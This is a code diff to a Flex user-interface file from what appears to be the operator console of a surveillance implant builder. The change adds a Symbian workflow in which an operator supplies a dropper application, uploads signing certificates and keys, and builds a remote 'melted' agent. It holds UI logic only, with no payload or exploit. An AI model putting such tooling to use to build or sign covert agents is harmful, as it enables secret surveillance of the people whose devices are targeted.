@@ -4,8 +4,10 @@
          xmlns:mx="library://ns.adobe.com/flex/mx" width="100%" height="100%" xmlns:build="it.ht.rcs.console.operations.view.agents.build.*">
   <fx:Script>
     <![CDATA[
-      import it.ht.rcs.console.operations.view.agents.build.UploadPopup;
+      import it.ht.rcs.console.build.controller.BuildManager;
+      import it.ht.rcs.console.build.model.SymbianConf;
       import it.ht.rcs.console.monitor.controller.LicenseManager;
+      import it.ht.rcs.console.operations.view.agents.build.UploadPopup;
       import it.ht.rcs.console.task.controller.DownloadManager;
       import it.ht.rcs.console.utils.AlertPopUp;
       
@@ -18,8 +20,46 @@
       
       private var fileReference:FileReference;
       
+      private var keyReference:FileReference;
+      
+      private var params:Object;
+
+      public function set platform(value:*):void
+      {
+        if (value == 'symbian') {
+          currentState = value;
+          if (BuildManager.instance.symbianConf == null)
+            getSymbianConf()
+        } else {
+          currentState='all';
+        }
+        
+        createBtn.platforms = [value];
+                
+      }
+      
+      public function getSymbianConf():void
+      {
+        BuildManager.instance.getSymbianConf(null, onSymbianConfResult, onSymbianConfFault)
+      }
+      
+      private function onSymbianConfResult(e:ResultEvent):void
+      {
+        BuildManager.instance.symbianConf = e.result as SymbianConf;
+      }
+      
+      private function onSymbianConfFault(e:FaultEvent):void
+      {
+        trace("symbian conf fault")
+      }
+      
       private function browse():void
       {
+        if (parentDocument.platform == 'symbian')
+          currentState = 'symbian'
+        else
+          currentState = 'all';
+        
         fileReference = new FileReference();
         fileReference.addEventListener(Event.SELECT, fileSelection);
         fileReference.browse();
@@ -53,7 +93,15 @@
       {
         PopUpManager.removePopUp(uploadPopup);
         
-        var params:Object = {platform: parentDocument.platform, binary: {demo: createBtn.demo.selected}, melt: {input: event.data}, 'package': {type: 'remote'} };
+        if (!params) {
+          params = {platform: parentDocument.platform, binary: {demo: createBtn.demo.selected}, melt: {input: event.data, filename: fileName.text}, 'package': {type: 'remote'} };
+        } else {
+          // symbian case
+          params['melt'] = {input: event.data, filename: fileName.text}
+        }
+        
+        if (currentState == 'symbian')
+          params['sign']['edition'] = edition.selectedItem;
         
         params['factory'] = {_id: parentDocument.factory._id};
         
@@ -77,28 +125,149 @@
         PopUpManager.removePopUp(uploadPopup);
         AlertPopUp.show(event.type);
       }
-      
-      public function set platform(platform:*):void
+            
+      private function uploadCert(event:Event):void
       {
-        if (platform == null)
-          return;
+        fileReference.addEventListener(HTTPStatusEvent.HTTP_STATUS, onUploadError);
+        fileReference.addEventListener(IOErrorEvent.IO_ERROR, onUploadError);
+        fileReference.addEventListener(SecurityErrorEvent.SECURITY_ERROR, onUploadError);
+        fileReference.addEventListener(DataEvent.UPLOAD_COMPLETE_DATA, onCertUploadComplete);
         
-        createBtn.platforms = [platform];
+        uploadPopup=PopUpManager.createPopUp(this.parentDocument as DisplayObject, UploadPopup, true) as UploadPopup;
+        uploadPopup.fileReference=fileReference;
+        PopUpManager.centerPopUp(uploadPopup);
+      }
+      
+      
+      private function onCertUploadComplete(event:DataEvent):void
+      {
+        PopUpManager.removePopUp(uploadPopup);
+        if(!params.sign)
+          params.sign={};
+        params.sign.cert=event.data;
+      }
+      
+      private function onKeyUploadComplete(event:DataEvent):void
+      {
+        PopUpManager.removePopUp(uploadPopup);
+        if(!params.sign)
+          params.sign={};
+        params.sign.key=event.data;
+      }
+      
+      private function editSymbianConf():void
+      {
+        var symbianConf:SymbianConfigurationForm=PopUpManager.createPopUp((this.parentDocument as DisplayObject).parent, SymbianConfigurationForm, true) as SymbianConfigurationForm;
+        PopUpManager.centerPopUp(symbianConf);
+      }
+      
+      private function browseForCert():void
+      {
+        if(!params)
+          params = {platform: 'symbian', binary: {demo: createBtn.demo.selected}, sign: {edition: 'symbian3'}};
+        
+        fileReference=new FileReference();
+        fileReference.addEventListener(Event.SELECT, uploadCert);
+        fileReference.browse([new FileFilter("Cer", "*.cer")]);
+      }
+      
+      private function browseForKey():void
+      {
+        if(!params)
+          params = {platform: 'symbian', binary: {demo: createBtn.demo.selected}, sign: {edition: 'symbian3'}};
+        keyReference=new FileReference();
+        keyReference.addEventListener(Event.SELECT, onKeySelected);
+        keyReference.browse([new FileFilter("Key", "*.key")]);
+      }
+      
+      private function onKeySelected(e:Event):void
+      {
+        uploadKey()
+      }
+      
+      private function uploadKey():void
+      {
+        keyReference.addEventListener(HTTPStatusEvent.HTTP_STATUS, onUploadError);
+        keyReference.addEventListener(IOErrorEvent.IO_ERROR, onUploadError);
+        keyReference.addEventListener(SecurityErrorEvent.SECURITY_ERROR, onUploadError);
+        keyReference.addEventListener(DataEvent.UPLOAD_COMPLETE_DATA, onKeyUploadComplete);
+        
+        uploadPopup=PopUpManager.createPopUp(this.parentDocument as DisplayObject, UploadPopup, true) as UploadPopup;
+        uploadPopup.fileReference=keyReference;
+        PopUpManager.centerPopUp(uploadPopup);
       }
       
     ]]>
   </fx:Script>
   
   <s:states>
-    <s:State name="normal"/>
+    <s:State name="all"/>
     <s:State name="fileSelected"/>
+    <s:State name='symbian'/>
   </s:states>
   
-  <s:HGroup left.normal="10" top.normal="10" verticalAlign="middle">
+  <s:HGroup left="10" top="10" verticalAlign="middle">
     <s:Label text="{R.get('APPLICATION_DROPPER')}:" fontWeight="bold"/>
     <s:Button excludeFrom="fileSelected" width="100" label="{R.get('BROWSE')}..." click="browse()"/>
     <s:Label id="fileName" includeIn="fileSelected" buttonMode="true" click="browse()"
              maxDisplayedLines="1" width="140" toolTip="{R.get('CLICK_TO_CHANGE_FILE')}"/>    
+  </s:HGroup>
+  
+  <s:Form includeIn="symbian"
+          left="10"
+          top="105"
+          visible="{BuildManager.instance.symbianConf.uids.length==6}">
+    <s:FormItem label="{R.get('SYMBIAN_CERT')}">
+      <s:Button width="80"
+                label="{R.get('BROWSE')}..."
+                click="browseForCert()"/>
+    </s:FormItem>
+    <s:FormItem label="{R.get('SYMBIAN_KEY')}">
+      <s:Button width="80"
+                label="{R.get('BROWSE')}..."
+                click="browseForKey()"/>
+    </s:FormItem>
+    <s:FormItem label="S60 Edition">
+      <s:DropDownList id="edition"
+                      selectedIndex="0"
+                      width="95">
+        <mx:ArrayCollection>
+          <fx:String>Symbian3</fx:String>
+          <fx:String>5th</fx:String>
+          <fx:String>3rd</fx:String>
+        </mx:ArrayCollection>
+      </s:DropDownList>
+    </s:FormItem>
+    
+  </s:Form>
+  
+  <!-- Symbian configuration is OK-->
+  
+  <s:HGroup includeIn="symbian" 
+            left="10"
+            top="290"
+            verticalAlign="middle" 
+            visible="{BuildManager.instance.symbianConf.uids.length==6}"
+            includeInLayout="{BuildManager.instance.symbianConf.uids.length==6}">
+    <s:Spacer height="40"/>
+    <s:HGroup verticalAlign="middle">
+      <s:Label text="{R.get('SYMBIAN_CONF_OK')}."/>
+      <s:Label text="{R.get('SYMBIAN_CHANGE')}" buttonMode="true" click="editSymbianConf()"/>
+    </s:HGroup>
+  </s:HGroup>
+  
+  <!-- You have no Symbian configuration yet, please provide the data: -->
+  
+  <s:HGroup includeIn="symbian" 
+            left="10"
+            top="190"
+            verticalAlign="middle"
+            visible="{BuildManager.instance.symbianConf.uids.length!=6}"
+            includeInLayout="{BuildManager.instance.symbianConf.uids.length!=6}">
+    <s:Label text="{R.get('SYMBIAN_CONF_MISSED')}"
+             color="0xFF0000"
+             fontWeight="bold"/>
+    <s:Button label="{R.get('CONFIGURATION_SET')}" click="editSymbianConf()"/>
   </s:HGroup>
   
   <build:CreateWithDemoButton id="createBtn" left="10" bottom="0" right="10" create="{create}"/>
